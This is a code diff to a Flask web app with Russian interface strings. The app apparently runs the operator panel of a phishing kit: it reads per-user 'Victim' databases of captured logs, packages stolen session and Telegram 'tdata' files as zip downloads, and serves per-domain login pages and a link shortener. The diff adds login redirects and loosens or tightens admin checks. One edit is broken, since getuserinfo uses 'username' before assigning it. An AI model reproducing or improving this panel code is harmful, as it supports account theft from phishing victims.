@@ -231,7 +231,7 @@ async def panel():
 
 ###########################################
 #                                         #
-#                  Панель                 #
+#              Статистика                 #
 #                                         #
 ###########################################
 @app.route('/statistics', methods=['POST', 'GET'])
@@ -240,13 +240,14 @@ async def statistics():
     if domain == server_domain:
         if 'username' in session:
             username = session['username']
-            db.UpdateActivity(session['username'])
-            db_victim = Victim(f'./users/{username}/database.db')
-            logs = db_victim.GetLogs()
-
-            return render_template('statistics.html', logs=logs)
         else:
-            return 'Нет доступа'
+            return redirect(url_for('login'))
+        
+        username = session['username']
+        db.UpdateActivity(session['username'])
+        db_victim = Victim(f'./users/{username}/database.db')
+        logs = db_victim.GetLogs()
+        return render_template('statistics.html', logs=logs)
     else:
         try:
             path = 'shortener'
@@ -266,15 +267,20 @@ async def statistics():
 
 ###########################################
 #                                         #
-#                  Панель                 #
+#           Сократитель ссылок            #
 #                                         #
 ###########################################
 @app.route('/shortener', methods=['POST', 'GET'])
 async def shortener():
     domain = request.headers.get('Host')
     if domain == server_domain:
+        if 'username' in session:
+            username = session['username']
+        else:
+            return redirect(url_for('login'))
+        
         admin = False
-        if session['username'] == db.GetAdmins(session['username'])[0]:
+        if username == db.GetAdmins(session['username'])[0]:
             admin = True
         else:
             db.UpdateActivity(session['username'])
@@ -303,7 +309,7 @@ async def shortener():
 
 ###########################################
 #                                         #
-#             Добавить FAQ                #
+#           Сократить ссылку              #
 #                                         #
 ###########################################
 @app.route('/short_it', methods=['POST'])
@@ -341,7 +347,7 @@ async def short_it():
             response = {'status': 'error', 'message': 'Ошибка'}
         return jsonify(response)
     else:
-        return {'status': 'error', 'message': 'Ошибка'}
+        return jsonify({'status': 'error', 'message': 'Ошибка'})
 
 
 
@@ -357,6 +363,11 @@ async def short_it():
 async def news():
     domain = request.headers.get('Host')
     if domain == server_domain:
+        if 'username' in session:
+            username = session['username']
+        else:
+            return redirect(url_for('login'))
+        
         username = session['username']
         global db
         news = db.GetNews()
@@ -400,6 +411,11 @@ async def news():
 async def info():
     domain = request.headers.get('Host')
     if domain == server_domain:
+        if 'username' in session:
+            username = session['username']
+        else:
+            return redirect(url_for('login'))
+        
         username = session['username']
         global db
         admin = False
@@ -744,8 +760,6 @@ async def add_domain():
 ###########################################
 @app.route('/edit_domain', methods=['POST'])
 async def edit_domain():
-    print(session)
-    print(session['username'])
     if 'username' in session:
         username = session['username']
         domain = request.form.get('domain')
@@ -852,18 +866,16 @@ async def getinfo():
     if 'username' in session:
         username = session['username']
 
-        if username == db.GetAdmins(username)[0]:    
-            id = request.form.get('id')
-            db_victim = Victim(f'./users/{username}/database.db')
-            data = db_victim.GetDomainInfo(id)
-            db.UpdateActivity(session['username'])
+        id = request.form.get('id')
+        db_victim = Victim(f'./users/{username}/database.db')
+        data = db_victim.GetDomainInfo(id)
+        db.UpdateActivity(session['username'])
 
-            if data[0]:
-                return jsonify({'status': 'success', 'message': 'Данные получены', "data": list(data[0])})
-            else:
-                return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+        if data[0]:
+            return jsonify({'status': 'success', 'message': 'Данные получены', "data": list(data[0])})
         else:
-            return jsonify({'status': 'error', 'message': 'Нет доступа'})
+            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+
     else:
         return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
@@ -874,24 +886,27 @@ async def getinfo():
 ###########################################
 @app.route('/getuserinfo', methods=['POST'])
 async def getuserinfo():
-    if 'username' in session:
+    if 'username' in session and session['username'] == db.GetAdmins(username)[0]:
         username = session['username']
-        if username == db.GetAdmins(username)[0]:
-            id = request.form.get('id')
-            data = db.GetUserBy('id', id)
+        
+        id = request.form.get('id')
+        data = db.GetUserBy('id', id)
 
-            if data:
-                return jsonify({'status': 'success', 'message': 'Данные получены', "data": data})
-            else:
-                return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+        if data:
+            return jsonify({'status': 'success', 'message': 'Данные получены', "data": data})
         else:
-            return jsonify({'status': 'error', 'message': 'Нет доступа'})
+            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
     else:
         return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
-@app.route('/tg', methods=['POST', 'GET'])
-async def tg():
-    return render_template('./domains/depian.online$login/jojo.html')
+
+
+
+
+
+# @app.route('/tg', methods=['POST', 'GET'])
+# async def tg():
+#     return render_template('./domains/depian.online$login/jojo.html')
 
 
 
@@ -1147,7 +1162,7 @@ async def remove_logs():
                     db_victim.RemoveLog(log)
             return jsonify({'status': 'success', 'message': 'Логи успешно удалены'})
         else:
-            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})
+            return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
 
 
@@ -1181,7 +1196,7 @@ async def create_session():
 
             return jsonify({'status': 'success', 'message': 'Успешно', 'url': f'http://{domain}/download/logs.zip'})
         else:
-            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})
+            return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
 
 ###########################################
@@ -1242,7 +1257,7 @@ async def create_tdata():
             return jsonify({'status': 'success', 'message': 'Успешно', 'url': f'http://{domain}/download/logs.zip'})
                 
         else:
-            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})
+            return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
 
 
@@ -1272,7 +1287,7 @@ async def download_tdata(filename):
             return send_file(return_data, mimetype='application/zip')
             
         else:
-            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})
+            return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
 
 
@@ -1301,11 +1316,11 @@ async def page_not_found(e):
 
 
 
-# ###########################################
-# #                                         #
-# #       Получить все данные домена        #
-# #                                         #
-# ###########################################
+###########################################
+#                                         #
+#       Получить все данные домена        #
+#                                         #
+###########################################
 @app.route('/<path>', methods=['GET'])
 async def path(path):
     host = request.headers.get('Host')
